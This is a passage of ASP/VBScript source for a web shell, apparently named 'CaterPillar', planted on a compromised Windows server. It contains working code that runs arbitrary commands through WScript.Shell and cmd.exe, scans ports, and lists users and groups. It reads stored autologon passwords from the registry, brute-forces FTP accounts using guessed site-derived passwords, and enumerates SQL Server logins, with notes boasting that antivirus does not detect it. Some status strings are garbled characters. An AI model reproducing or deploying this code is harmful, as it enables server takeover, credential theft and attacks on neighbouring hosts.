          Set T=CF.opentextfile(Path, 1, False)
          Txt=HTMLEncode(T.readall) 
          T.close
          Set T=Nothing
     Else
          Path=Session("FolderPath")&"\newfile.asp":Txt="??½¨??¼þ"
     End If
	 response.Write "<Form action='"&URL&"?Action2=Post' method='post' name='EditForm'>"
     response.Write "<input name='Action' value='EditFile' Type='hidden'>"
     response.Write "<table width='80%'  border='1' align='center'>"
     response.Write "<tr><td width='11%'>Path</td><td width='89%'>"
     response.Write "<input name='filepath' type='text' value='"&Path&"' id='filepath' class='TextBox' style='width:300px;' />*</td></tr>"
     response.Write "<tr><td>Content</td><td> <textarea name='content' rows='25' cols='100' id='content' class='TextBox'>"&Txt&"</textarea></td>"
     response.Write "</tr><tr><td> <input type='submit' name='a' value='Sumbit' id='a' class='buttom' /></td>"
     response.Write "</tr></table>"
	 response.Write "<p><i><a href='javascript:history.back(1);'>Back</a></i></p>"
     response.Write "</FORM>"
     SET CF = NOTHING
End Function
Function HTMLEncode(S)
  if not isnull(S) then
    S = replace(S, ">", "&gt;")
    S = replace(S, "<", "&lt;")
    S = replace(S, CHR(39), "&#39;")
    S = replace(S, CHR(34), "&quot;")
    S = replace(S, CHR(20), "&nbsp;")
    HTMLEncode = S
  end if
End Function
Sub cmd()
CmdCommand=request.Form("CmdCommand")
%>
	<p>[ CMD.NET for CaterPillar ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
    <p> Execute command with ASP.NET account(<span class="style3">Notice: only click "Run" to run</span>)</p>
    <p>- This function has fixed by Cater Pillar has not detected (2009/05/24)-</p>
	<form name='FormCmd' method='post' action='' onSubmit='FormCmd.submit.disabled=true;'>
<p>
Command::&nbsp;<input name='CmdCommand' type='text' class='TextBox' id='CmdCommand' value='<%Response.write(CmdCommand)%>' size='50'>
<input name='submit' type='submit' class='buttom' value=' Run '>
<input name='Run' type='hidden' id='Run' value='111'>
</p>
</form>
	<%
	If request.Form("Run") <> "" Then
	CmdCommand = request.Form("CmdCommand")
	response.Write CmdCommand
	Set objWShell = CreateObject("WScript.Shell")
    Set objCmd = objWShell.Exec(Server.MapPath(".") & "\" & CmdCommand )
    
    strPResult = objCmd.StdOut.Readall() 
    set objCmd = nothing: Set objWShell = nothing 
	response.write "<br>" & replace(strPResult,vbCrLf,"<br>")
	'RunCmdWSH(CmdCommand)
	End if
End Sub
Sub RunCmdWSH(CmdCommand)
	dim command
	dim fileObject
	dim oScriptNet
	dim tempFile
	set fileObject = CreateObject("Scripting.FileSystemObject")
	set oScriptNet = CreateObject("WSCRIPT.NETWORK")
	set tempFile = "C:\sites\tt.txt"
	If CmdCommand = "" Then
		command = "dir c:\"	
	else 
		command = CmdCommand
	End If	  
	call ExecuteCommand2(command,tempFile)
	call OutputTempFile2(tempFile,fileObject)
	
End Sub
Function ExecuteCommand2(cmd_to_execute, tempFile)
	  Dim oScript
	  oScript = Server.CreateObject("WSCRIPT.SHELL")
      Call oScript.Run ("cmd.exe /c " & cmd_to_execute & " > " & tempFile, 0, True)
End function
Sub OutputTempFile2(tempFile,fileObject)
    On Error Resume Next
	dim oFile
	set oFile = fileObject.OpenTextFile (tempFile, 1, False, 0)
	response.Write "txtCommand2" & vbcrlf & "<pre>" & (Server.HTMLEncode(oFile.ReadAll)) & "</pre>"
	oFile.Close
	'Call fileObject.DeleteFile(tempFile, True)
End sub
Sub existdir(temp)
       Dim myFSO
       SET myFSO = Server.CreateObject("Scripting.FileSystemObject")

		if  myFSO.FileExists(temp)=false and myFSO.FolderExists(temp)=false then 
			response.Write("<script>alert('Don\'t exist " & replace(temp,"\","\\")  &" ! Is it a CD-ROM ?');</sc" & "ript>")
			response.Write("<br><br><a href='javascript:history.back(1);'>Click Here Back</a>")
			response.End()
		end if
		SET myFSO = NOTHING
End Sub
Function Getparentdir(nowdir)
	dim temp,k
	temp=1
	k=0
	if len(nowdir)>4 then 
		nowdir=left(nowdir,len(nowdir)-1) 
	end if
	do while temp<>0
		k=temp+1
		temp=instr(temp,nowdir,"\")
		if temp =0 then
			exit do
		end if
		temp = temp+1
	loop
	if k<>2 then
		getparentdir=mid(nowdir,1,k-2)
	else
		getparentdir=nowdir
	end if
End function
Sub PortScan()
   Server.ScriptTimeout = 7776000
   if request.Form("port")="" then
      PortList="21,23,25,80,110,135,139,445,1433,3389,43958"
   else
      PortList=request.Form("port")
   end if
   if request.Form("ip")="" then
      IP="127.0.0.1"
   else
      IP=request.Form("ip")
   end if
%>
<p>[ Scan Port &nbsp;for CaterPillar ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
<p> Port Scan with ASP account(<span class="style3">Notice: only click "Scan" to san port</span>)</p>
<p>- This function has fixed by Kater Cillar has not detected (2009/04/27)-</p>
  

<form name='PortScanForm' method='post' action='' onSubmit='PortScanForm.submit.disabled=true;'>
<p>Scan IP:&nbsp;
<input name='ip' type='text' class='TextBox' id='ip' value='<%Response.write(IP)%>' size='60'>
<br>Port List:
<input name='port' type='text' class='TextBox' size='60' value='<%Response.write(PortList)%>'>
<input name='submit' type='submit' class='buttom' value=' scan '>
<input name='scan' type='hidden' id='scan' value='111'>

</p></form>
<%
If request.Form("scan") <> "" Then
timer1 = timer
Response.write "<hr><table border='3' width ='' height=''><tr bgcolor=black><td align=center><font color=white><b>Ip Address<b></font></td><td align=center><font color=white><b>Port<b></font></td><td align=center><font color=white><b>Status<b></font></td></tr>"
tmp = Split(request.Form("port"),",")
ip = Split(request.Form("ip"),",")
For hu = 0 to Ubound(ip)
      If InStr(ip(hu),"-") = 0 Then
             For i = 0 To Ubound(tmp)
               If Isnumeric(tmp(i)) Then 
				   Response.write  "<tr>"
		           Response.write  "<td><b>" & ip(hu) & "</b></td>"
                   Response.write  "<td><center>" & tmp(i) & "</center></td>"
				   If GetCheckPort(ip(hu),tmp(i)) <> "Close" then
				   Response.write "<td><center><font color=red><b>Open</b></font></center></td>" 
				   else
				   Response.write  "<td><center>Close</center></td>" 
				   end if
				   Response.write  "</tr>"
			   Else
                   seekx = InStr(tmp(i), "-")
                   If seekx > 0 Then
                         startN = Left(tmp(i), seekx - 1 )
                         endN = Right(tmp(i), Len(tmp(i)) - seekx )
                           If Isnumeric(startN) and Isnumeric(endN) Then
                              For j = startN To endN
                            '  Call CheckPort(ip(hu), j)
                              Next
                           Else
                               %>
                                startN & " or " & endN & " is not number<br>
                                <%
                           End If
                    Else
                       %>
                        tmp(i) & " is not number<br>
                        <%
                    End If
                End If
              Next
           Else
                    ipStart = Mid(ip(hu),1,InStrRev(ip(hu),"."))
                  For xxx = Mid(ip(hu),InStrRev(ip(hu),".")+1,1) to Mid(ip(hu),InStr(ip(hu),"-")+1,Len(ip(hu))-InStr(ip(hu),"-"))
                    For i = 0 To Ubound(tmp)
                    If Isnumeric(tmp(i)) Then 
                       ' Call CheckPort(ipStart & xxx, tmp(i))
                    Else
                        seekx = InStr(tmp(i), "-")
                        If seekx > 0 Then
                           startN = Left(tmp(i), seekx - 1 )
                           endN = Right(tmp(i), Len(tmp(i)) - seekx )
                           If Isnumeric(startN) and Isnumeric(endN) Then
                               For j = startN To endN
                              '  Call CheckPort(ipStart & xxx,j)
                                Next
                            Else
                               %>
                                startN & " or " & endN & " is not number<br>
                               <%
                            End If
                        Else
                           %>
                           tmp(i) & " is not number<br>
                           <%
                        End If
                    End If
                    Next
                 Next
           End If
    Next
Response.write  "</table>"
timer2 = timer
thetime=cstr(int(timer2-timer1))
Response.write "Process in " &thetime& " s"
END IF
end sub
Function GetCheckPort(targetip, portNum)
	On Error Resume Next
	set conn = Server.CreateObject("ADODB.connection")
	connstr="Provider=SQLOLEDB.1;Data Source=" & targetip &","& portNum &";User ID=lake2;Password=;"
	conn.ConnectionTimeout = 1
	conn.open connstr
	If Err Then
		If Err.number = -2147217843 or Err.number = -2147467259 Then
		    	If InStr(Err.description, "(Connect()).") > 0 Then
			    GetCheckPort = "Close" 
			Else
				GetCheckPort = "Open" 
			End If
		End If
	End If
End Function
Sub homedirectory()
%>
<p align=center>[ Home Directory Accounts ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
				<% 
				Response.write "<table border='3' align='center' width ='' height=''><tr bgcolor=black><td align=center><font color=white><b>Name<b></font></td><td align=center><font color=white><b>Path<b></font></td></tr>"
                Set oContainer = GetObject("WinNT://" & strComputerName & "")
				For Each oIADs In oContainer
                  If (oIADs.Class = "User") Then
				     Response.write  "<tr>"
				     Response.write  "<td><b>" & oIADs.Name & "</b></td>"
				     Response.write  "<td><b>" & oIADs.HomeDirectory & "</b></td>"
				     Response.write  "</tr>"
                   End If
				Next
				Response.write  "</table>"
End Sub

Function  ipconfig()
%>
<p align=center>[ Ip Configuration ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
				<% 
	   on error resume next
       dim wsh
       set wsh=createobject("Wscript.Shell")
	   Response.Write "[Network Connections]<br><hr size=1>"
       EnableTCPIPKey="HKLM\SYSTEM\currentControlSet\Services\Tcpip\Parameters\EnableSecurityFilters"
       isEnable=Wsh.Regread(EnableTcpipKey)
       If isEnable=0 or isEnable="" Then
           Notcpipfilter=1
       End If

       ApdKey="HKLM\SYSTEM\ControlSet001\Services\Tcpip\Linkage\Bind"
       Apds=Wsh.RegRead(ApdKey)
       If IsArray(Apds) Then 
           For i=LBound(Apds) To UBound(Apds)-1
             ApdB=Replace(Apds(i),"\Device\","")
             Response.Write "<b>Device "&i&" Interface: "&ApdB&"</b><br>"
             Path="HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\"
             'IP Address
             IPKey=Path&ApdB&"\IPAddress"
             IPaddr=Wsh.Regread(IPKey)
             If IPaddr(0)<>"" Then
                  For j=Lbound(IPAddr) to Ubound(IPAddr)
                  Response.Write "<li><b>IP Adress: "&j&" Is: "&IPAddr(j)&"</b><br>"
                  Next
             Else
                  Response.Write "<li><b>IP Adress: "&j&" Is: Blank</b><br>"
             End if
			 'Mac Address
             MacKey=Path&ApdB&"\SubnetMask"
             Macaddr=Wsh.Regread(MacKey)
             If Macaddr(0)<>"" Then
                  For j=Lbound(MacAddr) to Ubound(MacAddr)
                  Response.Write "<li><b>Mac Adress: "&j&" Is: "&MacAddr(j)&"</b><br>"
                  Next
             Else
                  Response.Write "<li><b>IP Adress: "&j&" Is: Blank</b><br>"
             End if
            'Default Gateway
            GateWayKey=Path&ApdB&"\DefaultGateway"
            GateWay=Wsh.Regread(GateWayKey)
            If isarray(GateWay) Then
                  For j=Lbound(Gateway) to Ubound(Gateway)
                  Response.Write "<li><b> Default Gateway: "&j&" Is: "&Gateway(j)&"<br></b>"
                  Next
            Else
                  Response.Write "<li><b> Default Gateway: "&j&" Is: Blank</b><br>"
            End if
            'DNS Server
            DNSKey=Path&ApdB&"\NameServer"
            DNSstr=Wsh.RegRead(DNSKey)
            If DNSstr<>"" Then
               Response.Write "<li><b>DNS Server Is: "&DNSstr&"<br></b>"
            Else
               Response.Write "<li><b>DNS Server Is: Blank</b><br>"
            End If
           'TCP/IP
            if Notcpipfilter=1 Then 
                  Response.Write "<li><b>TCP/IP</b><br>"
            else
                  ETK="\TCPAllowedPorts"
                  EUK="\UDPAllowedPorts"
                  FullTCP=Path&ApdB&ETK
                  FullUDP=path&ApdB&EUK
                  tcpallow=Wsh.RegRead(FullTCP)
                  If tcpallow(0)="" or tcpallow(0)=0 Then
                      Response.Write "<li>????µ?TCP¶?????:?«²?<br>"
                  Else
                      Response.Write "<li>????µ?TCP¶?????:"
                      For j = LBound(tcpallow) To UBound(tcpallow)
                      Response.Write tcpallow(j)&","
                      Next
                  Response.Write "<Br>"
                 End if
            udpallow=Wsh.RegRead(FullUDP)
                      If udpallow(0)="" or udpallow(0)=0 Then
                           Response.Write "<li>????µ?UDP¶?????:?«²?<br>"
                      Else
                           Response.Write "<li>????µ?UDP¶?????:"
                           for j = LBound(udpallow) To UBound(udpallow)
                           Response.Write UDPallow(j)&","
                           next
                      Response.Write "<br>"
                     End if
                  End if
                 Response.Write "------------------------------------------------<br>"
                Next
           end if
	    Response.Write "<br><br>[System Properties]<br><hr size=1>"

        pcnamekey="HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName"
        pcname=wsh.RegRead(pcnamekey)
        if pcname="" Then pcname="System Properties<br>"
          Response.Write "<li><b>Computer Name:"&pcname&"</b><br>"
          AdminNameKey="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AltDefaultUserName"
          AdminName=wsh.RegRead(AdminNameKey)
          if adminname="" Then AdminName="Administrator"
                Response.Write "<li><b>Admin Name:"&AdminName&"</b><br>"
                isAutologin="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoAdminLogon"
                Autologin=Wsh.RegRead(isAutologin)
                if Autologin=0 or Autologin="" Then
          Response.Write "<li><b>Autologin Is Disable</b><br>"
          Else
                Response.Write "<li><b>Autologin Is Enable</b><br>"
                Admin=Wsh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultUserName")
                Passwd=Wsh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultPassword")
                Response.Write "<li type=square><b>User Name:"&Admin&"</b><br>"
                Response.Write "<li type=square><b>Password:"&Passwd&"</b><br>"
         End if
displogin=wsh.regRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\DontDisplayLastUserName")
If displogin="" or displogin=0 Then disply="??" else disply="·?"
Response.Write "<li>??·????¾??´?µ?????»§:"&disply&"<br>"
NTMLkey="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\TelnetServer\1.0\NTML"
ntml=Wsh.RegRead(NTMLkey)
if ntml="" Then Ntml=1
Response.Write "<li>Telnet Ntml??????:"&ntml&"<br>"
hk="HKLM\SYSTEM\ControlSet001\Services\Tcpip\Enum\Count"
kk=wsh.RegRead(hk)
Response.Write"<li>µ±?°»?¶¯???¨bbbbb??:"&kk&"<br>"
Response.Write "------------------------------------<br><br><br>"
end Function

Sub localgroup()
if request.Form("ComputerStr")="" then
      ComputerStr="127.0.0.1"
   else
      ComputerStr=request.Form("ComputerStr")
   end if
%>
<p>[ local group  for CaterPillar ]        <i><a href="javascript:history.back(1);">Back</a></i></p>
<p> local group with ASP account(<span class="style3">Notice: only click "Start" to start Enumerating</span>)</p>
<p>- This function has fixed by Cater Pillar has not detected (2009/04/17)-</p>
<form name='LocalGroupForm' method='post' action='' onSubmit='LocalGroupForm.submit.disabled=true;'>
<p>
Server Name:&nbsp;<input name='ComputerStr' class='TextBox' id='ComputerStr' value='<%Response.write(ComputerStr)%>' size='25'>
<input name='submit' type='submit' class='buttom' value=' Get List '>
<input name='scan' type='hidden' id='scan' value='111'>
</p>
</form>
<%
If request.Form("scan") <> "" Then
                ComputerStr = request.Form("ComputerStr")
                Set oContainer = GetObject("WinNT://" & ComputerStr)
				oContainer.filter = Array("Group")
				Response.write "<b>List of Group for " & ucase(ComputerStr) & ":</b>"
				Response.write "<table border='3' align='left' width ='' height=''><tr bgcolor=black>"
				Response.write "<td align=center><font color=white><b>Group<b></font></td>"
				Response.write "<td align=center><font color=white><b>Operate<b></font></td></tr>"
				For Each oIADs In oContainer
				count = count + 1
				Response.write  "<tr>"
				Response.write  "<td><b>" & oIADs.Name & "</b></td>"
				'Response.write  "<td><a title='Click Here for " & oIADs.name & "'s Users' onclick='window.open('info.asp?cmd=getsettings&computer" & ComputerStr & "&group=" & oIADs.name & "','groupinfo','width=600,height=300 resizable=yes,scrollbars=yes,toolbar=no,status=no')' href=#>Users in Group</a></td>"
				Response.write "<td><a href='?action=LocalGroup&src=" & oIADs.name & "&Hostname=" & ComputerStr &"'>Users in Group</a></td>"
				Response.write  "</tr>"
				Next
				'Response.write  "</table>"
end if
End Sub
Sub RunUserLocalGroup(LocalGroup,Hostname)
		Response.write "<table border='3' width ='' height=''><tr bgcolor=black><td align=center><font color=white><b>Name<b></font></td></tr>"
                Set oContainer = GetObject("WinNT://"&Hostname&"/"&LocalGroup&", Group")
				For Each oIADs In oContainer.Members
              	     Response.write  "<tr>"
				     Response.write  "<td><b>" & oIADs.Name & "</b></td>"
				     Response.write  "</tr>"
				Next
				Response.write  "</table>"
End Sub
Sub FtpBrute()
   CheckBoxRemove=" checked"
   CheckBoxReverse=" checked"
   CheckBoxPeer=" checked"
   CheckBoxHome=" checked"
   CheckBoxDash=" checked"
   if request.Form("IpAddress")="" then
      IpAddress=ServerIP
   else
      IpAddress=request.Form("IpAddress")
   end if
    ConcatUser=request.Form("ConcatUser")
    CheckPassword=request.Form("CheckPassword")
    ConcatPass=request.Form("ConcatPass")
	RemoveUser=request.Form("RemoveUser")
	
	if Request("CheckBoxRemove")<>"yes" then CheckBoxRemove=""
	if Request("CheckBoxReverse")<>"yes" then CheckBoxReverse=""
	if Request("CheckBoxPeer")<>"yes" then CheckBoxPeer=""
	if Request("CheckBoxHome")<>"yes" then CheckBoxHome=""
	if Request("CheckBoxDash")<>"yes" then CheckBoxDash=""
   
%>
<p>[ Ftp Brute &nbsp;for CaterPillar ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
<p> Ftp Brute with ASP account(<span class="style3">Notice: only click "Start" to start brute</span>)</p>
<p>- This function has fixed by Cater Pillar has not detected (2009/03/27)-</p>  

<form name='FormFtpBrute' method='post' action='' onSubmit='FormFtpBrute.submit.disabled=true;'>
<p>
ip address:&nbsp;<input name='IpAddress' type='text' class='TextBox' id='IpAddress' value='<%Response.write(IpAddress)%>' size='30'>
Peer:&nbsp;&nbsp;&nbsp;<input type="checkbox" name="CheckBoxPeer" value='yes'<%Response.write(CheckBoxPeer)%>>
Concatenation User:&nbsp;<input name='ConcatUser' type='text' class='TextBox' id='ConcatUser' value='<%Response.write(ConcatUser)%>' size='20'>
Dash Dump:&nbsp;&nbsp;&nbsp;<input type="checkbox" name="CheckBoxDash" value='yes'<%Response.write(CheckBoxDash)%>><br>
Password:&nbsp;&nbsp;<input name='CheckPassword' type='text' class='TextBox' id='CheckPassword' value='<%Response.write(CheckPassword)%>' size='30'>
Home:&nbsp;<input type="checkbox" name="CheckBoxHome" value='yes'<%Response.write(CheckBoxHome)%>>
Concatenation Pass:&nbsp;<input name='ConcatPass' type='text' class='TextBox' id='ConcatPass' value='<%Response.write(ConcatPass)%>' size='20'><br>
String Remove:&nbsp;<input name='RemoveUser' type='text' class='TextBox' id='RemoveUser' value='<%Response.write(RemoveUser)%>' size='26'>
<input type="checkbox" name="CheckBoxRemove" value='yes'<%Response.write(CheckBoxRemove)%>>&nbsp;Remove String
<input type="checkbox" name="CheckBoxReverse" value='yes'<%Response.write(CheckBoxReverse)%>>&nbsp;Reverse Password<br>
User From:&nbsp;&nbsp;<select name='StrBtn' class='TextBox'>
       <option value=0>www.whosonmyserver.com</option>
       <option value=1>LocalHost</option>
       </select>
<input name='submit' type='submit' class='buttom' value=' scan '>
<input name='scan' type='hidden' id='scan' value='111'>
</p>
</form>
<%
If request.Form("scan") <> "" Then
IpAddress = request.Form("IpAddress")
ConcatUser=request.Form("ConcatUser")
CheckPassword=request.Form("CheckPassword")
ConcatPass=request.Form("ConcatPass")
CheckBoxPeer=Request.Form("CheckBoxPeer")
RemoveUser=request.Form("RemoveUser")
CheckBoxRemove=Request.Form("CheckBoxRemove")
CheckBoxReverse=Request.Form("CheckBoxReverse")
CheckBoxHome=Request.Form("CheckBoxHome")
CheckBoxDash=Request.Form("CheckBoxDash")
If GetCheckPort(IpAddress,21) <> "Close" then
    If request.Form("StrBtn") = 0 Then
	  Call RunFtpBrute(IpAddress,ConcatUser,CheckPassword,ConcatPass,CheckBoxPeer,RemoveUser,CheckBoxRemove,CheckBoxReverse,CheckBoxHome,CheckBoxDash)
	else
      Call RunFtpBruteLocal(IpAddress,ConcatUser,CheckPassword,ConcatPass,RemoveUser,CheckBoxRemove,CheckBoxReverse,CheckBoxHome)
	end if
else
Response.write "ip:" & IpAddress & " Close port 21"
end if
end if
End Sub
Function FtpLogin(IpAddress,User,Password)
    Set objWShell = CreateObject("WScript.Shell")
    Set objCmd = objWShell.Exec(Server.MapPath(".") & "\FtpLogin.exe " & IpAddress & " " & User & " " & Password )
    
    strPResult = objCmd.StdOut.Readall() 
    set objCmd = nothing: Set objWShell = nothing 
	FtpLogin = strPResult
End Function
Sub RunFtpBruteLocal(IpAddress,ConcatUser,CheckPassword,ConcatPass,RemoveUser,CheckBoxRemove,CheckBoxReverse,CheckBoxHome)
Dim strResulttrue,strResultfalse
Response.write "<hr><table border='3' width ='' height=''><tr bgcolor=black><td align=center><font color=white><b>Name<b></font></td><td align=center><font color=white><b>Password<b></font></td><td align=center><font color=white><b>Status<b></font></td></tr>"
                Set oContainer = GetObject("WinNT://" & strComputerName & "")
				For Each oIADs In oContainer
                  If (oIADs.Class = "User") Then
				  mypassword=oIADs.Name
				   	   If CheckPassword <> "" Then
                           mypassword = CheckPassword
                       Else
					   if CheckBoxRemove="yes" then
                        If RemoveUser <> "" Then
							mypassword = Replace(mypassword, RemoveUser, "")
                        End If
					   End if
					        If ConcatPass <> "" Then
                               if CheckBoxHome="yes" then
                               mypassword = ConcatPass & mypassword
							   else
							   mypassword = mypassword & ConcatPass
							   end if
                            End If
					    End If
					 if CheckBoxReverse="yes" then
                        mypassword = StrReverse(mypassword)
                     End If
					 if FtpLogin(IpAddress,oIADs.Name,mypassword) <>"False" then
				     strResulttrue = strResulttrue & "<tr>"
				     strResulttrue = strResulttrue & "<td><b>" & oIADs.Name & "</b></td>"
					 strResulttrue = strResulttrue & "<td><b>" & mypassword & "</b></td>"
					 strResulttrue = strResulttrue & "<td><center><font color=red><b>True</b></font></center></td>"
				     strResulttrue = strResulttrue & "</tr>"
					 else
					 strResultfalse = strResultfalse & "<tr>"
				     strResultfalse = strResultfalse & "<td><b>" & oIADs.Name & "</b></td>"
					 strResultfalse = strResultfalse & "<td><b>" & mypassword & "</b></td>"
					 strResultfalse = strResultfalse & "<td><center><b>False</b></center></td>"
				     strResultfalse = strResultfalse & "</tr>"
					 end if
                   End If
				Next
				Response.write  strResulttrue & strResultfalse & "</table>"
End Sub
Sub RunFtpBrute(IpAddress,ConcatUser,CheckPassword,ConcatPass,CheckBoxPeer,RemoveUser,CheckBoxRemove,CheckBoxReverse,CheckBoxHome,CheckBoxDash)
Dim objXMLHTTP, xml, text, user, website
Dim strResulttrue,strResultfalse
'Set xml = Server.CreateObject  ("Microsoft.XMLHTTP")
'Or if this dosn't work then try :
Set xml = Server.CreateObject("MSXML2.ServerXMLHTTP")
xml.Open "GET", "http://www.whosonmyserver.com/?s="&IpAddress&"&submit=Lookup", false
xml.Send
text = xml.ResponseText
pos=InStr(text,"<table>")
text=Right(text,Len(text)-pos-6)
pos=InStr(text,"</table>")
text=Left(text,pos-1)

Response.write "<hr><table border='3' width ='' height=''><tr bgcolor=black><td align=center><font color=white><b>Name<b></font></td><td align=center><font color=white><b>Password<b></font></td><td align=center><font color=white><b>Website<b></font></td><td align=center><font color=white><b>Status<b></font></td></tr>"
Do While Instr(text, "<tr><td>") <> 0
    pos=InStr(text,"<tr><td>")
    text=Right(text,Len(text)-pos-8)
    pos=InStr(text,"http://")
    text=Right(text,Len(text)-pos-6)
    pos=InStr(text,"/")
    website=Left(text,pos-1)
	user=website
	        If Instr(user, "www.") <> 0 Then
		        user=Right(user,Len(user)-(Instr(user, "www."))-3)
			End If
	text=Right(text,Len(text)-pos-1)
	mypassword=user
	        if CheckBoxPeer<>"yes" then
                        If Instr(user, ".") <> 0 Then
		                user=Left(user,(Instr(user, "."))-1)
		                End If
						mypassword=user
			else
			            If Instr(user, ".") <> 0 Then
		                mypassword=Left(user,(Instr(user, "."))-1)
		                End If
            End If
			 if CheckBoxDash="yes" then
			     If Instr(user, "-") <> 0 Then
				    mypassword=Right(user,Len(user)-(Instr(user, "-")))
					user=Left(user,(Instr(user, "-"))-1)
				 End if
			 End if
					  if CheckBoxRemove="yes" then
                        If RemoveUser <> "" Then
							user = Replace(user, RemoveUser, "")
                        End If
                    End If
				   	   If CheckPassword <> "" Then
                           mypassword = CheckPassword
                       Else
					        If ConcatPass <> "" Then
							   if CheckBoxHome="yes" then
                               mypassword = ConcatPass & mypassword
							   else
							   mypassword = mypassword & ConcatPass
							   end if
                            End If
					    End If
					 If ConcatUser <> "" Then
                               user = user & ConcatUser
                     End If
					 if CheckBoxReverse="yes" then
                        mypassword = StrReverse(mypassword)
                     End If
					 if FtpLogin(IpAddress,user,mypassword) <>"False" then
				     strResulttrue = strResulttrue & "<tr>"
				     strResulttrue = strResulttrue & "<td><b>" & user & "</b></td>"
					 strResulttrue = strResulttrue & "<td><b>" & mypassword & "</b></td>"
					 strResulttrue = strResulttrue & "<td>" & website & "</td>"
					 strResulttrue = strResulttrue & "<td><center><font color=red><b>True</b></font></center></td>"
				     strResulttrue = strResulttrue & "</tr>"
					 else
					 strResultfalse = strResultfalse & "<tr>"
				     strResultfalse = strResultfalse & "<td><b>" & user & "</b></td>"
					 strResultfalse = strResultfalse & "<td><b>" & mypassword & "</b></td>"
					 strResultfalse = strResultfalse & "<td>" & website & "</td>"
					 strResultfalse = strResultfalse & "<td><center><b>False</b></center></td>"
				     strResultfalse = strResultfalse & "</tr>"
					 end if
Loop
Response.write  strResulttrue & strResultfalse & "</table>"
'text=HTMLEncode(text)
'Response.write "Content<textarea name='content' rows='25' cols='100' id='content' class='TextBox'>"&text&"</textarea>"

Set xml = Nothing
End Sub
Function DbEnumerate()
Dim objSQLServer,colDatabases,objDatabase

if request.Form("Host")="" then
      Host=ServerIP
   else
      Host=request.Form("Host")
   end if
   if request.Form("SqlName")="" then
      SqlName="sa"
   else
      SqlName=request.Form("SqlName")
   end if
   SqlPass = request.Form("SqlPass")
%>
<p>[ Enumerate SQL Databases for WebAdmin ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
<p>  Enumerate SQL Databases account(<span class="style3">Notice: only click "Run" to Start</span>)</p>
<form name='DbEnumerateForm' method='post' action='' onSubmit='DbEnumerateForm.submit.disabled=true;'>
<p>Host:<input name="Host" type="text" value="<%Response.write(Host)%>" id="Host" class="TextBox" style="width:300px;" /></p>
<p>SQL Name:<input name="SqlName" type="text" value="<%Response.write(SqlName)%>" id="SqlName" class="TextBox" style="width:100px;" />
SQL Password:<input name="SqlPass" type="text" value="<%Response.write(SqlPass)%>" id="SqlPass" class="TextBox" style="width:100px;" />
<input type="submit" name="ButtonDbEnumerate" value="Run" id="ButtonDbEnumerate" class="buttom" />  
</form>
<%
If request.Form("ButtonDbEnumerate") <> "" Then
Host = request.Form("Host")
SqlName = request.Form("SqlName")
SqlPass = request.Form("SqlPass")	
Set objSQLServer = CreateObject("SQLDMO.SQLServer")
'objSQLServer.LoginSecure = True
objSQLServer.LoginTimeout = 15

objSQLServer.Connect Host,SqlName,SqlPass
        Set colDatabases = server.createobject("sqldmo.database")
        
		Response.write "<hr><table border='3' width ='' height=''><tr bgcolor=black><td align=center><font color=white><b>Name<b></font></td></tr>"
               For Each colDatabases In objSQLServer.Databases
                     Response.write  "<tr>"
				     Response.write  "<td><b>" & colDatabases.Name & "</b></td>"
				    ' Response.write  "<td><b>" & colDatabases.UserName & "</b></td>"
				     Response.write  "</tr>"
				Next
				Response.write  "</table>"
				
				Set objDevice = Server.CreateObject("SQLDMO.login")
 		Response.write "<hr><table border='3' width ='' height=''><tr bgcolor=black><td align=center><font color=white><b>Name<b></font></td></tr>"

  For Each objDevice In objSQLServer.logins
                     Response.write  "<tr>"
				     Response.write  "<td><b>" & objDevice.Name & "</b></td>"
				     Response.write  "<td><b>" & objDevice.Database & "</b></td>"
				     Response.write  "<td><b>" & objDevice.DenyNTLogin & "</b></td>"
				     Response.write  "<td><b>" & objDevice.UserData & "</b></td>"
				     Response.write  "<td><b>" & objDevice.SystemObject & "</b></td>"
				     Response.write  "</tr>"
	
  Next
Response.write  "</table>"
Set colDatabases = objSQLServer.ServerRoles

For Each objDatabase In colDatabases
   Response.write objDatabase.Name
Next
end if
End Function
Function DbEnumerateLogin()
Dim objSQLServer,objDevice
CheckBoxRemove=" checked"
CheckBoxReverse=" checked"
CheckPassword=request.Form("CheckPassword")
ConcatUser=request.Form("ConcatUser")
RemoveUser=request.Form("RemoveUser")
if Request("CheckBoxRemove")<>"yes" then CheckBoxRemove=""
if Request("CheckBoxReverse")<>"yes" then CheckBoxReverse=""
if request.Form("Host")="" then
      Host=ServerIP
   else
      Host=request.Form("Host")
   end if
   if request.Form("SqlName")="" then
      SqlName="sa"
   else
      SqlName=request.Form("SqlName")
   end if
   SqlPass = request.Form("SqlPass")
%>
<p>[ User SQL Enum Login for WebAdmin ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
<p>  User SQL Enum Login account(<span class="style3">Notice: only click "Run" to Start</span>)</p>
<form name='DbEnumerateLoginForm' method='post' action='' onSubmit='DbEnumerateLoginForm.submit.disabled=true;'>
